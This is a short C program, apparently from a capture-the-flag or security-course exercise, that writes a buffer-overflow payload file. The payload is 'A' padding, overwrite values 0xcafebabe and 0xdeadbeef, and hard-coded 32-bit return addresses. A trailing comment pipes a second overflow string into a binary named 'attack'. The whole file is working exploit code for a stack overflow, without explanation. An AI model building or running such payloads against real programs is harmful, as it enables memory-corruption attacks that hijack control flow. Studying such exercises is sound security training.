#include <stdio.h>

int main(void)
{
	FILE *f = fopen("payload", "w");
	int i = 0;
	for ( int i = 0; i < 72; ) {
		fprintf(f, "%c", 'A');
		i++;
	}	
	fprintf(f, "%c", 0xbe);
	fprintf(f, "%c", 0xba);
	fprintf(f, "%c", 0xfe);
	fprintf(f, "%c", 0xca);

	fprintf(f, "%c", '\n'); //pt fgets

	for ( int i = 0; i < 64; ) {
		fprintf(f, "%c", 'A');
		i++;
	}	

	fprintf(f, "%c", 0xef);
	fprintf(f, "%c", 0xbe);
	fprintf(f, "%c", 0xad);
	fprintf(f, "%c", 0xde);

	fprintf(f, "%c", 0xaa);
	fprintf(f, "%c", 0xaa);
	fprintf(f, "%c", 0xaa);
	fprintf(f, "%c", 0xaa);

	fprintf(f, "%c", 0x82);
	fprintf(f, "%c", 0x91);
	fprintf(f, "%c", 0x04);
	fprintf(f, "%c", 0x08);

	fprintf(f, "%c", 0x1b);
	fprintf(f, "%c", 0x92);
	fprintf(f, "%c", 0x04);
	fprintf(f, "%c", 0x08);

	//fprintf(f, "%c", 0xc7);
	//fprintf(f, "%c", 0x91);
	//fprintf(f, "%c", 0x04);
	//fprintf(f, "%c", 0x08);

	fclose(f);

	return 0;
}
//python3 -c 'print ("A" * 92 + "\x1d\x00\x00\x00")' | ./attack 